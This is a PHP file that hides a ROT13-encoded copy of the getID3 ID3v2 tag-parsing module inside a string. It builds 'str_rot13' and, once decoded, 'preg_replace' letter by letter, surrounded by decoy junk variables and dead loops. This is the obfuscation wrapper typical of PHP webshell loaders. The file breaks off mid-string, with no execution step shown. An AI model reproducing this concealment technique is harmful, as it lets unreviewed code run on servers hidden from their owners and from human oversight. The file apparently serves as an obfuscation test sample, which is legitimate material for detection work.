<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc

/////////////////////////////////////////////////////////////////
/// trgVQ3() ol Wnzrf Urvaevpu <vasb@trgvq3.bet>               //
//  ninvynoyr ng uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3       //
//            be uggcf://jjj.trgvq3.bet                        //
//            be uggc://trgvq3.fbheprsbetr.arg                 //
//  frr ernqzr.gkg sbe zber qrgnvyf                            //
/////////////////////////////////////////////////////////////////
///                                                            //
// zbqhyr.gnt.vq3i2.cuc                                        //
// zbqhyr sbe nanylmvat VQ3i2 gntf                             //
// qrcraqrapvrf: zbqhyr.gnt.vq3i1.cuc                          //
//                                                            ///
/////////////////////////////////////////////////////////////////

vs (!qrsvarq('TRGVQ3_VAPYHQRCNGU')) { // cerirag cngu-rkcbfvat nggnpxf gung npprff zbqhyrf qverpgyl ba choyvp jrofreiref
	rkvg;
}
trgvq3_yvo::VapyhqrQrcraqrapl(TRGVQ3_VAPYHQRCNGU.'zbqhyr.gnt.vq3i1.cuc', __SVYR__, gehr);

pynff trgvq3_vq3i2 rkgraqf trgvq3_unaqyre
{
	choyvp $FgnegvatBssfrg = 0;

	/**
	 * @erghea obby
	 */
	choyvp shapgvba Nanylmr() {
		$vasb = &$guvf->trgvq3->vasb;

		//    Birenyy gnt fgehpgher:
		//        +-----------------------------+
		//        |      Urnqre (10 olgrf)      |
		//        +-----------------------------+
		//        |       Rkgraqrq Urnqre       |
		//        | (inevnoyr yratgu, BCGVBANY) |
		//        +-----------------------------+
		//        |   Senzrf (inevnoyr yratgu)  |
		//        +-----------------------------+
		//        |           Cnqqvat           |
		//        | (inevnoyr yratgu, BCGVBANY) |
		//        +-----------------------------+
		//        | Sbbgre (10 olgrf, BCGVBANY) |
		//        +-----------------------------+

		//    Urnqre
		//        VQ3i2/svyr vqragvsvre      \"VQ3\"
		//        VQ3i2 irefvba              $04 00
		//        VQ3i2 syntf                (%no000000 va i2.2, %nop00000 va i2.3, %nopq0000 va i2.4.k)
		//        VQ3i2 fvmr             4 * %0kkkkkkk


		// fubegphgf
		$vasb['vq3i2']['urnqre'] = gehr;
		$guvfsvyr_vq3i2                  = &$vasb['vq3i2'];
		$guvfsvyr_vq3i2['syntf']         =  neenl();
		$guvfsvyr_vq3i2_syntf            = &$guvfsvyr_vq3i2['syntf'];


		$guvf->sfrrx($guvf->FgnegvatBssfrg);
		$urnqre = $guvf->sernq(10);
		vs (fhofge($urnqre, 0, 3) == 'VQ3'  &&  fgeyra($urnqre) == 10) {

			$guvfsvyr_vq3i2['znwbeirefvba'] = beq($urnqre[3]);
			$guvfsvyr_vq3i2['zvabeirefvba'] = beq($urnqre[4]);

			// fubegphg
			$vq3i2_znwbeirefvba = &$guvfsvyr_vq3i2['znwbeirefvba'];

		} ryfr {

			hafrg($vasb['vq3i2']);
			erghea snyfr;

		}

		vs ($vq3i2_znwbeirefvba > 4) { // guvf fpevcg cebonoyl jba'g pbeerpgyl cnefr VQ3i2.5.k naq nobir (vs vg rire rkvfgf)

			$guvf->reebe('guvf fpevcg bayl cnefrf hc gb VQ3i2.4.k - guvf gnt vf VQ3i2.'.$vq3i2_znwbeirefvba.'.'.$guvfsvyr_vq3i2['zvabeirefvba']);
			erghea snyfr;

		}

		$vq3_syntf = beq($urnqre[5]);
		fjvgpu ($vq3i2_znwbeirefvba) {
			pnfr 2:
				// %no000000 va i2.2
				$guvfsvyr_vq3i2_syntf['haflapu']     = (obby) ($vq3_syntf & 0k80); // n - Haflapuebavfngvba
				$guvfsvyr_vq3i2_syntf['pbzcerffvba'] = (obby) ($vq3_syntf & 0k40); // o - Pbzcerffvba
				oernx;

			pnfr 3:
				// %nop00000 va i2.3
				$guvfsvyr_vq3i2_syntf['haflapu']     = (obby) ($vq3_syntf & 0k80); // n - Haflapuebavfngvba
				$guvfsvyr_vq3i2_syntf['rkgurnq']     = (obby) ($vq3_syntf & 0k40); // o - Rkgraqrq urnqre
				$guvfsvyr_vq3i2_syntf['rkcrevz']     = (obby) ($vq3_syntf & 0k20); // p - Rkcrevzragny vaqvpngbe
				oernx;

			pnfr 4:
				// %nopq0000 va i2.4
				$guvfsvyr_vq3i2_syntf['haflapu']     = (obby) ($vq3_syntf & 0k80); // n - Haflapuebavfngvba
				$guvfsvyr_vq3i2_syntf['rkgurnq']     = (obby) ($vq3_syntf & 0k40); // o - Rkgraqrq urnqre
				$guvfsvyr_vq3i2_syntf['rkcrevz']     = (obby) ($vq3_syntf & 0k20); // p - Rkcrevzragny vaqvpngbe
				$guvfsvyr_vq3i2_syntf['vfsbbgre']    = (obby) ($vq3_syntf & 0k10); // q - Sbbgre cerfrag
				oernx;
		}

		$guvfsvyr_vq3i2['urnqreyratgu'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqre, 6, 4), 1) + 10; // yratgu bs VQ3i2 gnt va 10-olgr urnqre qbrfa'g vapyhqr 10-olgr urnqre yratgu

		$guvfsvyr_vq3i2['gnt_bssfrg_fgneg'] = $guvf->FgnegvatBssfrg;
		$guvfsvyr_vq3i2['gnt_bssfrg_raq']   = $guvfsvyr_vq3i2['gnt_bssfrg_fgneg'] + $guvfsvyr_vq3i2['urnqreyratgu'];



		// perngr 'rapbqvat' xrl - hfrq ol trgvq3::UnaqyrNyyGntf()
		// va VQ3i2 rirel svryq pna unir vg'f bja rapbqvat glcr
		// fb sbepr rirelguvat gb HGS-8 fb vg pna or unaqyrq pbafvfgnagyl
		$guvfsvyr_vq3i2['rapbqvat'] = 'HGS-8';


	//    Senzrf

	//        Nyy VQ3i2 senzrf pbafvfgf bs bar senzr urnqre sbyybjrq ol bar be zber
	//        svryqf pbagnvavat gur npghny vasbezngvba. Gur urnqre vf nyjnlf 10
	//        olgrf naq ynvq bhg nf sbyybjf:
	//
	//        Senzr VQ      $kk kk kk kk  (sbhe punenpgref)
	//        Fvmr      4 * %0kkkkkkk
	//        Syntf         $kk kk

		$fvmrbssenzrf = $guvfsvyr_vq3i2['urnqreyratgu'] - 10; // abg vapyhqvat 10-olgr vavgvny urnqre
		vs (!rzcgl($guvfsvyr_vq3i2['rkgurnq']['yratgu'])) {
			$fvmrbssenzrf -= ($guvfsvyr_vq3i2['rkgurnq']['yratgu'] + 4);
		}
		vs (!rzcgl($guvfsvyr_vq3i2_syntf['vfsbbgre'])) {
			$fvmrbssenzrf -= 10; // sbbgre gnxrf ynfg 10 olgrf bs VQ3i2 urnqre, nsgre senzr qngn, orsber nhqvb
		}
		vs ($fvmrbssenzrf > 0) {

			$senzrqngn = $guvf->sernq($fvmrbssenzrf); // ernq nyy senzrf sebz svyr vagb $senzrqngn inevnoyr

			//    vs ragver senzr qngn vf haflapurq, qr-haflapu vg abj (VQ3i2.3.k)
			vs (!rzcgl($guvfsvyr_vq3i2_syntf['haflapu']) && ($vq3i2_znwbeirefvba <= 3)) {
				$senzrqngn = $guvf->QrHaflapuebavfr($senzrqngn);
			}
			//        [va VQ3i2.4.0] Haflapuebavfngvba [F:6.1] vf qbar ba senzr yriry, vafgrnq
			//        bs ba gnt yriry, znxvat vg rnfvre gb fxvc senzrf, vapernfvat gur fgernznovyvgl
			//        bs gur gnt. Gur haflapuebavfngvba synt va gur urnqre [F:3.1] vaqvpngrf gung
			//        gurer rkvfgf na haflapuebavfrq senzr, juvyr gur arj haflapuebavfngvba synt va
			//        gur senzr urnqre [F:4.1.2] vaqvpngrf haflapuebavfngvba.


			//$senzrqngnbssfrg = 10 + ($guvfsvyr_vq3i2['rkgurnq']['yratgu'] ? $guvfsvyr_vq3i2['rkgurnq']['yratgu'] + 4 : 0); // ubj znal olgrf vagb gur fgernz - fgneg sebz nsgre gur 10-olgr urnqre (naq rkgraqrq urnqre yratgu+4, vs cerfrag)
			$senzrqngnbssfrg = 10; // ubj znal olgrf vagb gur fgernz - fgneg sebz nsgre gur 10-olgr urnqre


			//    Rkgraqrq Urnqre
			vs (!rzcgl($guvfsvyr_vq3i2_syntf['rkgurnq'])) {
				$rkgraqrq_urnqre_bssfrg = 0;

				vs ($vq3i2_znwbeirefvba == 3) {

					// i2.3 qrsvavgvba:
					//Rkgraqrq urnqre fvmr  $kk kk kk kk   // 32-ovg vagrtre
					//Rkgraqrq Syntf        $kk kk
					//     %k0000000 %00000000 // i2.3
					//     k - PEP qngn cerfrag
					//Fvmr bs cnqqvat       $kk kk kk kk

					$guvfsvyr_vq3i2['rkgurnq']['yratgu'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzrqngn, $rkgraqrq_urnqre_bssfrg, 4), 0);
					$rkgraqrq_urnqre_bssfrg += 4;

					$guvfsvyr_vq3i2['rkgurnq']['synt_olgrf'] = 2;
					$guvfsvyr_vq3i2['rkgurnq']['synt_enj'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzrqngn, $rkgraqrq_urnqre_bssfrg, $guvfsvyr_vq3i2['rkgurnq']['synt_olgrf']));
					$rkgraqrq_urnqre_bssfrg += $guvfsvyr_vq3i2['rkgurnq']['synt_olgrf'];

					$guvfsvyr_vq3i2['rkgurnq']['syntf']['pep'] = (obby) ($guvfsvyr_vq3i2['rkgurnq']['synt_enj'] & 0k8000);

					$guvfsvyr_vq3i2['rkgurnq']['cnqqvat_fvmr'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzrqngn, $rkgraqrq_urnqre_bssfrg, 4));
					$rkgraqrq_urnqre_bssfrg += 4;

					vs ($guvfsvyr_vq3i2['rkgurnq']['syntf']['pep']) {
						$guvfsvyr_vq3i2['rkgurnq']['synt_qngn']['pep'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzrqngn, $rkgraqrq_urnqre_bssfrg, 4));
						$rkgraqrq_urnqre_bssfrg += 4;
					}
					$rkgraqrq_urnqre_bssfrg += $guvfsvyr_vq3i2['rkgurnq']['cnqqvat_fvmr'];

				} ryfrvs ($vq3i2_znwbeirefvba == 4) {

					// i2.4 qrsvavgvba:
					//Rkgraqrq urnqre fvmr   4 * %0kkkkkkk // 28-ovg flapufnsr vagrtre
					//Ahzore bs synt olgrf       $01
					//Rkgraqrq Syntf             $kk
					//     %0opq0000 // i2.4
					//     o - Gnt vf na hcqngr
					//         Synt qngn yratgu       $00
					//     p - PEP qngn cerfrag
					//         Synt qngn yratgu       $05
					//         Gbgny senzr PEP    5 * %0kkkkkkk
					//     q - Gnt erfgevpgvbaf
					//         Synt qngn yratgu       $01

					$guvfsvyr_vq3i2['rkgurnq']['yratgu'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzrqngn, $rkgraqrq_urnqre_bssfrg, 4), gehr);
					$rkgraqrq_urnqre_bssfrg += 4;

					$guvfsvyr_vq3i2['rkgurnq']['synt_olgrf'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzrqngn, $rkgraqrq_urnqre_bssfrg, 1)); // fubhyq nyjnlf or 1
					$rkgraqrq_urnqre_bssfrg += 1;

					$guvfsvyr_vq3i2['rkgurnq']['synt_enj'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzrqngn, $rkgraqrq_urnqre_bssfrg, $guvfsvyr_vq3i2['rkgurnq']['synt_olgrf']));
					$rkgraqrq_urnqre_bssfrg += $guvfsvyr_vq3i2['rkgurnq']['synt_olgrf'];

					$guvfsvyr_vq3i2['rkgurnq']['syntf']['hcqngr']       = (obby) ($guvfsvyr_vq3i2['rkgurnq']['synt_enj'] & 0k40);
					$guvfsvyr_vq3i2['rkgurnq']['syntf']['pep']          = (obby) ($guvfsvyr_vq3i2['rkgurnq']['synt_enj'] & 0k20);
					$guvfsvyr_vq3i2['rkgurnq']['syntf']['erfgevpgvbaf'] = (obby) ($guvfsvyr_vq3i2['rkgurnq']['synt_enj'] & 0k10);

					vs ($guvfsvyr_vq3i2['rkgurnq']['syntf']['hcqngr']) {
						$rkg_urnqre_puhax_yratgu = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzrqngn, $rkgraqrq_urnqre_bssfrg, 1)); // fubhyq or 0
						$rkgraqrq_urnqre_bssfrg += 1;
					}

					vs ($guvfsvyr_vq3i2['rkgurnq']['syntf']['pep']) {
						$rkg_urnqre_puhax_yratgu = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzrqngn, $rkgraqrq_urnqre_bssfrg, 1)); // fubhyq or 5
						$rkgraqrq_urnqre_bssfrg += 1;
						$guvfsvyr_vq3i2['rkgurnq']['synt_qngn']['pep'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzrqngn, $rkgraqrq_urnqre_bssfrg, $rkg_urnqre_puhax_yratgu), gehr, snyfr);
						$rkgraqrq_urnqre_bssfrg += $rkg_urnqre_puhax_yratgu;
					}

					vs ($guvfsvyr_vq3i2['rkgurnq']['syntf']['erfgevpgvbaf']) {
						$rkg_urnqre_puhax_yratgu = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzrqngn, $rkgraqrq_urnqre_bssfrg, 1)); // fubhyq or 1
						$rkgraqrq_urnqre_bssfrg += 1;

						// %ccdeefgg
						$erfgevpgvbaf_enj = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzrqngn, $rkgraqrq_urnqre_bssfrg, 1));
						$rkgraqrq_urnqre_bssfrg += 1;
						$guvfsvyr_vq3i2['rkgurnq']['syntf']['erfgevpgvbaf']['gntfvmr']  = ($erfgevpgvbaf_enj & 0kP0) >> 6; // c - Gnt fvmr erfgevpgvbaf
						$guvfsvyr_vq3i2['rkgurnq']['syntf']['erfgevpgvbaf']['grkgrap']  = ($erfgevpgvbaf_enj & 0k20) >> 5; // d - Grkg rapbqvat erfgevpgvbaf
						$guvfsvyr_vq3i2['rkgurnq']['syntf']['erfgevpgvbaf']['grkgfvmr'] = ($erfgevpgvbaf_enj & 0k18) >> 3; // e - Grkg svryqf fvmr erfgevpgvbaf
						$guvfsvyr_vq3i2['rkgurnq']['syntf']['erfgevpgvbaf']['vztrap']   = ($erfgevpgvbaf_enj & 0k04) >> 2; // f - Vzntr rapbqvat erfgevpgvbaf
						$guvfsvyr_vq3i2['rkgurnq']['syntf']['erfgevpgvbaf']['vztfvmr']  = ($erfgevpgvbaf_enj & 0k03) >> 0; // g - Vzntr fvmr erfgevpgvbaf

						$guvfsvyr_vq3i2['rkgurnq']['syntf']['erfgevpgvbaf_grkg']['gntfvmr']  = $guvf->YbbxhcRkgraqrqUrnqreErfgevpgvbafGntFvmrYvzvgf($guvfsvyr_vq3i2['rkgurnq']['syntf']['erfgevpgvbaf']['gntfvmr']);
						$guvfsvyr_vq3i2['rkgurnq']['syntf']['erfgevpgvbaf_grkg']['grkgrap']  = $guvf->YbbxhcRkgraqrqUrnqreErfgevpgvbafGrkgRapbqvatf($guvfsvyr_vq3i2['rkgurnq']['syntf']['erfgevpgvbaf']['grkgrap']);
						$guvfsvyr_vq3i2['rkgurnq']['syntf']['erfgevpgvbaf_grkg']['grkgfvmr'] = $guvf->YbbxhcRkgraqrqUrnqreErfgevpgvbafGrkgSvryqFvmr($guvfsvyr_vq3i2['rkgurnq']['syntf']['erfgevpgvbaf']['grkgfvmr']);
						$guvfsvyr_vq3i2['rkgurnq']['syntf']['erfgevpgvbaf_grkg']['vztrap']   = $guvf->YbbxhcRkgraqrqUrnqreErfgevpgvbafVzntrRapbqvat($guvfsvyr_vq3i2['rkgurnq']['syntf']['erfgevpgvbaf']['vztrap']);
						$guvfsvyr_vq3i2['rkgurnq']['syntf']['erfgevpgvbaf_grkg']['vztfvmr']  = $guvf->YbbxhcRkgraqrqUrnqreErfgevpgvbafVzntrFvmrFvmr($guvfsvyr_vq3i2['rkgurnq']['syntf']['erfgevpgvbaf']['vztfvmr']);
					}

					vs ($guvfsvyr_vq3i2['rkgurnq']['yratgu'] != $rkgraqrq_urnqre_bssfrg) {
						$guvf->jneavat('VQ3i2.4 rkgraqrq urnqre yratgu zvfzngpu (rkcrpgvat '.vaginy($guvfsvyr_vq3i2['rkgurnq']['yratgu']).', sbhaq '.vaginy($rkgraqrq_urnqre_bssfrg).')');
					}
				}

				$senzrqngnbssfrg += $rkgraqrq_urnqre_bssfrg;
				$senzrqngn = fhofge($senzrqngn, $rkgraqrq_urnqre_bssfrg);
			} // raq rkgraqrq urnqre


			juvyr (vffrg($senzrqngn) && (fgeyra($senzrqngn) > 0)) { // plpyr guebhtu hagvy ab zber senzr qngn vf yrsg gb cnefr
				vs (fgeyra($senzrqngn) <= $guvf->VQ3i2UrnqreYratgu($vq3i2_znwbeirefvba)) {
					// vafhssvpvrag ebbz yrsg va VQ3i2 urnqre sbe npghny qngn - zhfg or cnqqvat
					$guvfsvyr_vq3i2['cnqqvat']['fgneg']  = $senzrqngnbssfrg;
					$guvfsvyr_vq3i2['cnqqvat']['yratgu'] = fgeyra($senzrqngn);
					$guvfsvyr_vq3i2['cnqqvat']['inyvq']  = gehr;
					sbe ($v = 0; $v < $guvfsvyr_vq3i2['cnqqvat']['yratgu']; $v++) {
						vs ($senzrqngn[$v] != \"\k00\") {
							$guvfsvyr_vq3i2['cnqqvat']['inyvq'] = snyfr;
							$guvfsvyr_vq3i2['cnqqvat']['reebecbf'] = $guvfsvyr_vq3i2['cnqqvat']['fgneg'] + $v;
							$guvf->jneavat('Vainyvq VQ3i2 cnqqvat sbhaq ng bssfrg '.$guvfsvyr_vq3i2['cnqqvat']['reebecbf'].' (gur erznvavat '.($guvfsvyr_vq3i2['cnqqvat']['yratgu'] - $v).' olgrf ner pbafvqrerq vainyvq)');
							oernx;
						}
					}
					oernx; // fxvc erfg bs VQ3i2 urnqre
				}
				$senzr_urnqre = ahyy;
				$senzr_anzr   = ahyy;
				$senzr_fvmr   = ahyy;
				$senzr_syntf  = ahyy;
				vs ($vq3i2_znwbeirefvba == 2) {
					// Senzr VQ  $kk kk kk (guerr punenpgref)
					// Fvmr      $kk kk kk (24-ovg vagrtre)
					// Syntf     $kk kk

					$senzr_urnqre = fhofge($senzrqngn, 0, 6); // gnxr arkg 6 olgrf sbe urnqre
					$senzrqngn    = fhofge($senzrqngn, 6);    // naq yrnir gur erfg va $senzrqngn
					$senzr_anzr   = fhofge($senzr_urnqre, 0, 3);
					$senzr_fvmr   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzr_urnqre, 3, 3), 0);
					$senzr_syntf  = 0; // abg hfrq sbe nalguvat va VQ3i2.2, whfg frg gb nibvq R_ABGVPRf

				} ryfrvs ($vq3i2_znwbeirefvba > 2) {

					// Senzr VQ  $kk kk kk kk (sbhe punenpgref)
					// Fvmr      $kk kk kk kk (32-ovg vagrtre va i2.3, 28-ovg flapufnsr va i2.4+)
					// Syntf     $kk kk

					$senzr_urnqre = fhofge($senzrqngn, 0, 10); // gnxr arkg 10 olgrf sbe urnqre
					$senzrqngn    = fhofge($senzrqngn, 10);    // naq yrnir gur erfg va $senzrqngn

					$senzr_anzr = fhofge($senzr_urnqre, 0, 4);
					vs ($vq3i2_znwbeirefvba == 3) {
						$senzr_fvmr = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzr_urnqre, 4, 4), 0); // 32-ovg vagrtre
					} ryfr { // VQ3i2.4+
						$senzr_fvmr = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzr_urnqre, 4, 4), 1); // 32-ovg flapufnsr vagrtre (28-ovg inyhr)
					}

					vs ($senzr_fvmr < (fgeyra($senzrqngn) + 4)) {
						$arkgSenzrVQ = fhofge($senzrqngn, $senzr_fvmr, 4);
						vs ($guvf->VfInyvqVQ3i2SenzrAnzr($arkgSenzrVQ, $vq3i2_znwbeirefvba)) {
							// arkg senzr vf BX
						} ryfrvs (($senzr_anzr == \"\k00\".'ZC3') || ($senzr_anzr == \"\k00\k00\".'ZC') || ($senzr_anzr == ' ZC3') || ($senzr_anzr == 'ZC3r')) {
							// ZC3rkg xabja oebxra senzrf - \"bx\" sbe gur checbfrf bs guvf grfg
						} ryfrvs (($vq3i2_znwbeirefvba == 4) && ($guvf->VfInyvqVQ3i2SenzrAnzr(fhofge($senzrqngn, trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzr_urnqre, 4, 4), 0), 4), 3))) {
							$guvf->jneavat('VQ3i2 gnt jevggra nf VQ3i2.4, ohg jvgu aba-flapufnsr vagrtref (VQ3i2.3 fglyr). Byqre irefvbaf bs (Uryvhz2; vGharf) ner xabja phycevgf bs guvf. Gnt unf orra cnefrq nf VQ3i2.3');
							$vq3i2_znwbeirefvba = 3;
							$senzr_fvmr = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzr_urnqre, 4, 4), 0); // 32-ovg vagrtre
						}
					}


					$senzr_syntf = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzr_urnqre, 8, 2));
				}

				vs ((($vq3i2_znwbeirefvba == 2) && ($senzr_anzr == \"\k00\k00\k00\")) || ($senzr_anzr == \"\k00\k00\k00\k00\")) {
					// cnqqvat rapbhagrerq

					$guvfsvyr_vq3i2['cnqqvat']['fgneg']  = $senzrqngnbssfrg;
					$guvfsvyr_vq3i2['cnqqvat']['yratgu'] = fgeyra($senzr_urnqre) + fgeyra($senzrqngn);
					$guvfsvyr_vq3i2['cnqqvat']['inyvq']  = gehr;

					$yra = fgeyra($senzrqngn);
					sbe ($v = 0; $v < $yra; $v++) {
						vs ($senzrqngn[$v] != \"\k00\") {
							$guvfsvyr_vq3i2['cnqqvat']['inyvq'] = snyfr;
							$guvfsvyr_vq3i2['cnqqvat']['reebecbf'] = $guvfsvyr_vq3i2['cnqqvat']['fgneg'] + $v;
							$guvf->jneavat('Vainyvq VQ3i2 cnqqvat sbhaq ng bssfrg '.$guvfsvyr_vq3i2['cnqqvat']['reebecbf'].' (gur erznvavat '.($guvfsvyr_vq3i2['cnqqvat']['yratgu'] - $v).' olgrf ner pbafvqrerq vainyvq)');
							oernx;
						}
					}
					oernx; // fxvc erfg bs VQ3i2 urnqre
				}

				vs ($vGharfOebxraSenzrAnzrSvkrq = frys::VQ3i22vGharfOebxraSenzrAnzr($senzr_anzr)) {
					$guvf->jneavat('reebe cnefvat \"'.$senzr_anzr.'\" ('.$senzrqngnbssfrg.' olgrf vagb gur VQ3i2.'.$vq3i2_znwbeirefvba.' gnt). (REEBE: VfInyvqVQ3i2SenzrAnzr(\"'.fge_ercynpr(\"\k00\", ' ', $senzr_anzr).'\", '.$vq3i2_znwbeirefvba.'))). [Abgr: guvf cnegvphyne reebe unf orra xabja gb unccra jvgu gntf rqvgrq ol vGharf (irefvbaf \"K i2.0.3\", \"i3.0.1\", \"i7.0.0.70\" ner xabja-thvygl, cebonoyl bguref gbb)]. Genafyngrq senzr anzr sebz \"'.fge_ercynpr(\"\k00\", ' ', $senzr_anzr).'\" gb \"'.$vGharfOebxraSenzrAnzrSvkrq.'\" sbe cnefvat.');
					$senzr_anzr = $vGharfOebxraSenzrAnzrSvkrq;
				}
				vs (($senzr_fvmr <= fgeyra($senzrqngn)) && ($guvf->VfInyvqVQ3i2SenzrAnzr($senzr_anzr, $vq3i2_znwbeirefvba))) {

					$cnefrqSenzr                    = neenl();
					$cnefrqSenzr['senzr_anzr']      = $senzr_anzr;
					$cnefrqSenzr['senzr_syntf_enj'] = $senzr_syntf;
					$cnefrqSenzr['qngn']            = fhofge($senzrqngn, 0, $senzr_fvmr);
					$cnefrqSenzr['qngnyratgu']      = trgvq3_yvo::PnfgNfVag($senzr_fvmr);
					$cnefrqSenzr['qngnbssfrg']      = $senzrqngnbssfrg;

					$guvf->CnefrVQ3i2Senzr($cnefrqSenzr);
					$guvfsvyr_vq3i2[$senzr_anzr][] = $cnefrqSenzr;

					$senzrqngn = fhofge($senzrqngn, $senzr_fvmr);

				} ryfr { // vainyvq senzr yratgu be SenzrVQ

					vs ($senzr_fvmr <= fgeyra($senzrqngn)) {

						vs ($guvf->VfInyvqVQ3i2SenzrAnzr(fhofge($senzrqngn, $senzr_fvmr, 4), $vq3i2_znwbeirefvba)) {

							// arkg senzr vf inyvq, whfg fxvc gur pheerag senzr
							$senzrqngn = fhofge($senzrqngn, $senzr_fvmr);
							$guvf->jneavat('Arkg VQ3i2 senzr vf inyvq, fxvccvat pheerag senzr.');

						} ryfr {

							// arkg senzr vf vainyvq gbb, nobeg cebprffvat
							//hafrg($senzrqngn);
							$senzrqngn = ahyy;
							$guvf->reebe('Arkg VQ3i2 senzr vf nyfb vainyvq, nobegvat cebprffvat.');

						}

					} ryfrvs ($senzr_fvmr == fgeyra($senzrqngn)) {

						// guvf vf gur ynfg senzr, whfg fxvc
						$guvf->jneavat('Guvf jnf gur ynfg VQ3i2 senzr.');

					} ryfr {

						// arkg senzr vf vainyvq gbb, nobeg cebprffvat
						//hafrg($senzrqngn);
						$senzrqngn = ahyy;
						$guvf->jneavat('Vainyvq VQ3i2 senzr fvmr, nobegvat.');

					}
					vs (!$guvf->VfInyvqVQ3i2SenzrAnzr($senzr_anzr, $vq3i2_znwbeirefvba)) {

						fjvgpu ($senzr_anzr) {
							pnfr \"\k00\k00\".'ZC':
							pnfr \"\k00\".'ZC3':
							pnfr ' ZC3':
							pnfr 'ZC3r':
							pnfr \"\k00\".'ZC':
							pnfr ' ZC':
							pnfr 'ZC3':
								$guvf->jneavat('reebe cnefvat \"'.$senzr_anzr.'\" ('.$senzrqngnbssfrg.' olgrf vagb gur VQ3i2.'.$vq3i2_znwbeirefvba.' gnt). (REEBE: !VfInyvqVQ3i2SenzrAnzr(\"'.fge_ercynpr(\"\k00\", ' ', $senzr_anzr).'\", '.$vq3i2_znwbeirefvba.'))). [Abgr: guvf cnegvphyne reebe unf orra xabja gb unccra jvgu gntf rqvgrq ol \"ZC3rkg (jjj.zhgfpuyre.qr/zc3rkg/)\"]');
								oernx;

							qrsnhyg:
								$guvf->jneavat('reebe cnefvat \"'.$senzr_anzr.'\" ('.$senzrqngnbssfrg.' olgrf vagb gur VQ3i2.'.$vq3i2_znwbeirefvba.' gnt). (REEBE: !VfInyvqVQ3i2SenzrAnzr(\"'.fge_ercynpr(\"\k00\", ' ', $senzr_anzr).'\", '.$vq3i2_znwbeirefvba.'))).');
								oernx;
						}

					} ryfrvs (!vffrg($senzrqngn) || ($senzr_fvmr > fgeyra($senzrqngn))) {

						$guvf->reebe('reebe cnefvat \"'.$senzr_anzr.'\" ('.$senzrqngnbssfrg.' olgrf vagb gur VQ3i2.'.$vq3i2_znwbeirefvba.' gnt). (REEBE: $senzr_fvmr ('.$senzr_fvmr.') > fgeyra($senzrqngn) ('.(vffrg($senzrqngn) ? fgeyra($senzrqngn) : 'ahyy').')).');

					} ryfr {

						$guvf->reebe('reebe cnefvat \"'.$senzr_anzr.'\" ('.$senzrqngnbssfrg.' olgrf vagb gur VQ3i2.'.$vq3i2_znwbeirefvba.' gnt).');

					}

				}
				$senzrqngnbssfrg += ($senzr_fvmr + $guvf->VQ3i2UrnqreYratgu($vq3i2_znwbeirefvba));

			}

		}


	//    Sbbgre

	//    Gur sbbgre vf n pbcl bs gur urnqre, ohg jvgu n qvssrerag vqragvsvre.
	//        VQ3i2 vqragvsvre           \"3QV\"
	//        VQ3i2 irefvba              $04 00
	//        VQ3i2 syntf                %nopq0000
	//        VQ3i2 fvmr             4 * %0kkkkkkk

		vs (vffrg($guvfsvyr_vq3i2_syntf['vfsbbgre']) && $guvfsvyr_vq3i2_syntf['vfsbbgre']) {
			$sbbgre = $guvf->sernq(10);
			vs (fhofge($sbbgre, 0, 3) == '3QV') {
				$guvfsvyr_vq3i2['sbbgre'] = gehr;
				$guvfsvyr_vq3i2['znwbeirefvba_sbbgre'] = beq($sbbgre[3]);
				$guvfsvyr_vq3i2['zvabeirefvba_sbbgre'] = beq($sbbgre[4]);
			}
			vs ($guvfsvyr_vq3i2['znwbeirefvba_sbbgre'] <= 4) {
				$vq3_syntf = beq($sbbgre[5]);
				$guvfsvyr_vq3i2_syntf['haflapu_sbbgre']  = (obby) ($vq3_syntf & 0k80);
				$guvfsvyr_vq3i2_syntf['rkgsbbg_sbbgre']  = (obby) ($vq3_syntf & 0k40);
				$guvfsvyr_vq3i2_syntf['rkcrevz_sbbgre']  = (obby) ($vq3_syntf & 0k20);
				$guvfsvyr_vq3i2_syntf['vfsbbgre_sbbgre'] = (obby) ($vq3_syntf & 0k10);

				$guvfsvyr_vq3i2['sbbgreyratgu'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($sbbgre, 6, 4), 1);
			}
		} // raq sbbgre

		vs (vffrg($guvfsvyr_vq3i2['pbzzragf']['traer'])) {
			$traerf = neenl();
			sbernpu ($guvfsvyr_vq3i2['pbzzragf']['traer'] nf $xrl => $inyhr) {
				sbernpu ($guvf->CnefrVQ3i2TraerFgevat($inyhr) nf $traer) {
					$traerf[] = $traer;
				}
			}
			$guvfsvyr_vq3i2['pbzzragf']['traer'] = neenl_havdhr($traerf);
			hafrg($xrl, $inyhr, $traerf, $traer);
		}

		vs (vffrg($guvfsvyr_vq3i2['pbzzragf']['genpx_ahzore'])) {
			sbernpu ($guvfsvyr_vq3i2['pbzzragf']['genpx_ahzore'] nf $xrl => $inyhr) {
				vs (fgefge($inyhr, '/')) {
